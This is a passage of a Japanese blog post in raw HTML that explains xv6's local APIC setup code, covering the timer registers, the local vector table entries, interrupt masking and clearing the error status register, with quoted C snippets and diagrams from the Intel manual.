&lt;h3 id=&quot;タイマの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BF%E3%82%A4%E3%83%9E%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;タイマの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;タイマの設定&lt;/h3&gt;
&lt;p&gt;続いては以下の行です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// The timer repeatedly counts down at bus frequency&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// from lapic[TICR] and then issues an interrupt.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// If xv6 cared more about precise timekeeping,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// TICR would be calibrated using an external time source.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TDCR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; X1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TIMER&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PERIODIC &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_TIMER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TICR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;TDCR&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;(0x03E0/4)&lt;/code&gt;ですが、これは&lt;code class=&quot;language-text&quot;&gt;Divide Configuration Register (for Timer)&lt;/code&gt;のオフセットです。&lt;/p&gt;
&lt;p&gt;この設定はローカルAPICタイマの周期を設定する際に使用します。&lt;/p&gt;
&lt;p&gt;ローカルAPICタイマとは、各プロセッサのローカルAPICに内臓されているタイマで、そのプロセッサのみに対して割込みを発生させます。&lt;/p&gt;
&lt;p&gt;ローカルAPICタイマは、カーネルから&lt;code class=&quot;language-text&quot;&gt;Timer Initial Count&lt;/code&gt;として設定された値を初期値として一定の間隔でデクリメントしていき、0になったときに割込みを発生させます。&lt;/p&gt;
&lt;p&gt;このデクリメント速度は、CPUのバス周波数を&lt;code class=&quot;language-text&quot;&gt;Timer Divide Configuration&lt;/code&gt;の値で割った値に依存します。&lt;/p&gt;
&lt;p&gt;ローカルAPICタイマでは、&lt;code class=&quot;language-text&quot;&gt;Periodic mode&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;One-shot mode&lt;/code&gt;の2種類の挙動を定義できます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Periodic mode&lt;/code&gt;の場合は、0になったカウントは自動的に初期値に戻り、デクリメントが再開されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;One-shot mode&lt;/code&gt;の場合は、カウントが0になって割込みを発生させた場合、プログラムが明示的に初期値を設定するまでカウントは0のままとなります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/APIC_timer&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC timer - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://japan.zdnet.com/article/20365986/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;タイマー割り込みとして、Local APICのタイマ割り込みを選択したことを示すメッセージ - ZDNet Japan&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSでは、&lt;code class=&quot;language-text&quot;&gt;Timer Divide Configuration&lt;/code&gt;の値は&lt;code class=&quot;language-text&quot;&gt;0x0000000B&lt;/code&gt;に設定されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d05d9531c380a9b7fae36b6a644a608f/0b533/image.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 39.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABF0lEQVQoz32RCYuDQAyF+///mdTCFhGLth3B+6rifb+dhJ2ltN0NPJgkbz4z8dD3PZZlQZqmeDxKVKVUVaEoCmRZJmsPzktZL396Ko+iCHGcoG1bZgzDgAMdKJIkge/7CIKAjY7jQNd12LbNNSXyeJ7Hcl3BXhqKgliHeZ45iWWDLt9uN1iWJSfOoIKmVB8q8hxN06Cua4zjyOd1XdlHrF9g13VPz6u4ue8791wheFpN05DKNRCAYORRsDfgp1DAKArxdT4z9HnyVx8D1Q7/iySOcTqdoB+PEML908c7pIUSeZqmN/GzpCmXezNNE4ZhIJR7/OQlBrF4wmetUtfrlf9yEPhw5Jnyy+XCEuLO4CAMsW0bXu9/A9hYY3E3+dHEAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d05d9531c380a9b7fae36b6a644a608f/8ac56/image.webp 240w,
/static/d05d9531c380a9b7fae36b6a644a608f/d3be9/image.webp 480w,
/static/d05d9531c380a9b7fae36b6a644a608f/b0a15/image.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d05d9531c380a9b7fae36b6a644a608f/8ff5a/image.png 240w,
/static/d05d9531c380a9b7fae36b6a644a608f/e85cb/image.png 480w,
/static/d05d9531c380a9b7fae36b6a644a608f/0b533/image.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d05d9531c380a9b7fae36b6a644a608f/0b533/image.png&quot;
            alt=&quot;2022/02/image.png&quot;
            title=&quot;2022/02/image.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/24547212.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel SDM vol3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;Timer Initial Count&lt;/code&gt;の値は&lt;code class=&quot;language-text&quot;&gt;lapicw(TICR, 10000000);&lt;/code&gt;によって&lt;code class=&quot;language-text&quot;&gt;10000000&lt;/code&gt;に設定されます。&lt;/p&gt;
&lt;p&gt;ちなみに以下の行は、&lt;code class=&quot;language-text&quot;&gt;Local Vector Table 0 (TIMER)&lt;/code&gt;の設定を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TIMER&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PERIODIC &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_TIMER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Local Vector Table(LVT)&lt;/code&gt;自体はローカルAPICにおけるイベントを割込みベクタに変換するためのテーブルです。&lt;/p&gt;
&lt;p&gt;LVTによって、ソフトウェアはローカル割込みがCPUに送信される方法を指定することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1fb117892fd2af6a004e0e16826524d0/0b533/image-1.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 119.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAARlAAAEZQAGA43XUAAADAklEQVQ4y32U2XLaQBBF+f9vyWOe8uiyg6GMXaHMvoPYQWKVMMh0+jQaAgR7qkYzmuXO7dtLKgxD2e/3cjgchPl6vbYxDCNZrVYyn/sym07Pe1OdbzYbWS6XNn58fNjI/m63kxRgtEgXBoOBtNttG+ndTsdGz/Ok1WpJt9s9j71eTxaLQIbDoQHS4jj+B3g8Ho0pLPp9T/oKApvxeGx9u93a3mw2k0CBRqORFIsFqVQqOhalWq1KFO2uAY9yam9/8vLj5y8Zjsa2jimubRT0kmkQBPYIsmD+GfCyLZYr6Q4nEkaRvhrZQYBp49FQstms1Ot1taR/dQ+s1F6dcfz8lFzuRWnX7LVP/b9tDjCKQnPIer0yGY4XeyfAhCF6NRoNMwET8do2iQAuuEdgvNAzUSIDjrhmeGMyb8Hg9TUnuZcXaXe6FlJRYj6Peb2uPDw86Jk3s+guoKPt9MKccrmsobE477MH88l4JOl0Wmq1+h0NbwBdkNM8jTXfD8xcQsZJMZ1M5Pn5WQqFokx07vv+94DMuVhRhoTHUjOGdUyGOZIM1MM9e9A35t+abGmoF9HR8/qWCaQhezAF+F6775QkYwBlzujylREwl//fAqITB3EChQHTuDyfzy31yFn0ch3vct7JwMP0M6DpooWgowWBlHK92WzaHh2zAQMctitd439zD3CTlCYAcIQbSTGEhykjYDgDLVmjEvHYFSBarRKGDsh1sofKwhz25C8lDlAAsQLA2AFutxtpKQgXOfgVIOsAAuRYoSOAi8UFQ4J1t4ukWChYTXMXenoQAEDRybGC4Uid5IIdlmDE/2moYYGHuQAgrPgPAv/kCJWDPeas43k0R6Zx8sAVoItBAE6hE8pXjaB/fHyUfD4v2UxG0zAjhzgB5EPOvr8XTC9KOqbXtFMcqvrPGowx8WTNWn4/PRlgRgEzWnBjZRjHiYYcLpVKBgQo80KiqevoBnsXCeQ5Z9krlcqyS7Io5VLssvFIo1FXp7RNH6KgmcRmpVI2Zx1vZKDQ0v8C6TUhDYjW/XoAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1fb117892fd2af6a004e0e16826524d0/8ac56/image-1.webp 240w,
/static/1fb117892fd2af6a004e0e16826524d0/d3be9/image-1.webp 480w,
/static/1fb117892fd2af6a004e0e16826524d0/b0a15/image-1.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1fb117892fd2af6a004e0e16826524d0/8ff5a/image-1.png 240w,
/static/1fb117892fd2af6a004e0e16826524d0/e85cb/image-1.png 480w,
/static/1fb117892fd2af6a004e0e16826524d0/0b533/image-1.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1fb117892fd2af6a004e0e16826524d0/0b533/image-1.png&quot;
            alt=&quot;2022/02/image-1.png&quot;
            title=&quot;2022/02/image-1.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;http://flint.cs.yale.edu/cs422/doc/24547212.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel SDM vol3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;LVTは以下の32bitレジスタから構成されています。詳細は実際に使用するときに見ていきます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LVT Timer Register (FEE0 0320H)&lt;/li&gt;
&lt;li&gt;LVT Thermal Monitor Register (FEE0 0330H)&lt;/li&gt;
&lt;li&gt;LVT Performance Counter Register (FEE0 0340H)&lt;/li&gt;
&lt;li&gt;LVT LINT0 Register (FEE0 0350H)&lt;/li&gt;
&lt;li&gt;LVT LINT1 Register (FEE0 0360H)&lt;/li&gt;
&lt;li&gt;LVT Error Register (FEE0 0370H)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;TIMER&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;(0x0320/4)&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;LVT Timer Register&lt;/code&gt;を指定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;LVT Timer Register&lt;/code&gt;はAPICのタイマが割込みを発生させた場合の割込みを指定します。&lt;/p&gt;
&lt;p&gt;ここでは&lt;code class=&quot;language-text&quot;&gt;PERIODIC&lt;/code&gt;によってLVTの18bit目の&lt;code class=&quot;language-text&quot;&gt;Timer Mode&lt;/code&gt;を1にセットすることで、タイマの動作を&lt;code class=&quot;language-text&quot;&gt;Periodic mode&lt;/code&gt;に変更しています。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;T_IRQ0 + IRQ_TIMER&lt;/code&gt;では、割込みベクタを設定していますが、セットしている値は&lt;code class=&quot;language-text&quot;&gt;0x20&lt;/code&gt;となっているようです。
(ググってもダイレクトな情報ソース見つからなかったのですが、たぶん&lt;code class=&quot;language-text&quot;&gt;INT 0x20&lt;/code&gt;みたいなタイマ割込みを指している？わからん。)&lt;/p&gt;
&lt;h3 id=&quot;disable-logical-interrupt-lines&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#disable-logical-interrupt-lines&quot; aria-label=&quot;disable logical interrupt lines permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disable logical interrupt lines&lt;/h3&gt;
&lt;p&gt;次いきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;(0x0350/4)&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;(0x0360/4)&lt;/code&gt;にそれぞれ&lt;code class=&quot;language-text&quot;&gt;0x00010000&lt;/code&gt;をセットしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Disable logical interrupt lines.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;LINT0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;LINT1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;(0x0340/4)&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;(0x0350/4)&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;LVT LINT0 Register&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;LVT LINT1 Register&lt;/code&gt;でした。&lt;/p&gt;
&lt;p&gt;これらはどちらも、LINT0およびLINT1ピンからの割込みを定義する割込みベクタです。&lt;/p&gt;
&lt;p&gt;ここで、17bit目をセットしてマスクを有効化しています。&lt;/p&gt;
&lt;p&gt;(なんでこの2つを無効化する必要があるのかは全然わかりませんでした！なぜ！！)&lt;/p&gt;
&lt;h3 id=&quot;disable-performance-counter-overflow-interrupts&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#disable-performance-counter-overflow-interrupts&quot; aria-label=&quot;disable performance counter overflow interrupts permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disable performance counter overflow interrupts&lt;/h3&gt;
&lt;p&gt;次行きます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Disable performance counter overflow interrupts&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// on machines that provide that interrupt entry.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lapic&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;VER&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PCINT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; MASKED&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PCINT&lt;/code&gt;はオーバフローが発生したときに割込みを生成する&lt;code class=&quot;language-text&quot;&gt;LVT Performance Counter Register&lt;/code&gt;を特定の条件下でマスクしています。&lt;/p&gt;
&lt;p&gt;その条件は、ローカルAPICの&lt;code class=&quot;language-text&quot;&gt;Version Register&lt;/code&gt;の値を16bit右シフトして下位8bitを取ったときの値が4より大きくなることです。&lt;/p&gt;
&lt;p&gt;意味は全然わかりませんでした。。&lt;/p&gt;
&lt;p&gt;とりあえずデバッガで実行してみたらこの行は実行されなかったので、xv6OSは&lt;code class=&quot;language-text&quot;&gt;LVT Performance Counter Register&lt;/code&gt;をマスクしないものとして先に進みます…。&lt;/p&gt;
&lt;h3 id=&quot;error-registerのセット&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#error-register%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88&quot; aria-label=&quot;error registerのセット permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Error Registerのセット&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;LVT Error Register&lt;/code&gt;の割込みベクタをセットしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Map error interrupt to IRQ_ERROR.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ERROR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; IRQ_ERROR&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;esrのクリア&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#esr%E3%81%AE%E3%82%AF%E3%83%AA%E3%82%A2&quot; aria-label=&quot;esrのクリア permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ESRのクリア&lt;/h3&gt;
&lt;p&gt;ここではESRをクリアしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Clear error status register (requires back-to-back writes).&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ESR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;lapicw&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ESR&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ESRは&lt;code class=&quot;language-text&quot;&gt;Error Status Register&lt;/code&gt;の略で、エラーが発生したときにbitがセットされます。&lt;/p&gt;
&lt;p&gt;対応は以下の図。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a62689b6484885eda853c23b71f5eeee/0b533/image-2.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
